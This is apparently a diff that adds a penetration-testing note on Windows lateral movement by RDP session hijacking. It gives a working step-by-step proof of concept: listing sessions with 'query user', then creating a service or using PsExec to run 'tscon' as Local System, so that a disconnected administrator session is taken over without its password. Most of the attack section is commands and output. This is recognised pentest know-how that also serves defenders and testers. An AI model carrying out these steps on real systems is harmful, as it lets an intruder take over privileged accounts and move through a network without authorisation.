@@ -1,0 +1,56 @@
+========================================================================================================================
+Lateral movement with RDP session hijacking
+========================================================================================================================
+
+During a penetration test, if you gain remote access (with local admin priv) on a target Windows server or workstation, you can hijack 
+the RDP session of any other user that were logged into the system but are now disconnected. You can also do it with a currenlty logged user 
+but he will be kick-out of his session and this will be suspicious.
+
+This technique allows  to move laterally by hijacking other user sessions without the need to know their passwords or dump and crack (or PTH)
+their password hashes to impersonate them.
+
+
+========================================================================================================================
+PoC - RDP session hijacking using TSCON 
+========================================================================================================================
+
+Step 1 - We use the account 'auditor' to log into a remote Windows server (using RDP)
+------------------------------------------------------------------------------------------
+
+> Note: The account 'auditor' has local admin priv on the remote Windows server
+
+
+Step 2 - We use the 'query user' command to display the list of available sessions
+----------------------------------------------------------------------------------------
+
+C:\Users\Auditor> query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>auditor               rdp-tcp#3           1  Active          .  7/27/2022 6:06 PM
+ administrator                             2  Disc            .  7/27/2022 6:05 PM
+ 
+ > On this server the account 'administrator' has been logged but its session (ID 2) is now disconnected.
+
+ 
+Step 3 - We create and execute a service that will execute TSCON with Local System level privileges and will hijack the session of the 'administrator' account
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Auditor> sc create svcrdpsessionhijack binpath="cmd.exe /k tscon 2 /dest:rdp-tcp#3"
+[SC] CreateService SUCCESS
+
+C:\Users\Auditor> net start svcrdpsessionhijack
+
+> We have now full access to the RDP session of the 'administrator' account.
+
+
+Step 3 Bis - We use PsExec to become Local System and then run TSCON to hijack the session of the 'administrator' account
+--------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Auditor\Desktop> PsExec64.exe -s -i cmd.exe
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Windows\system32> tscon 2 /dest:rdp-tcp#3
+
+> We have now full access to the RDP session of the 'administrator' account.
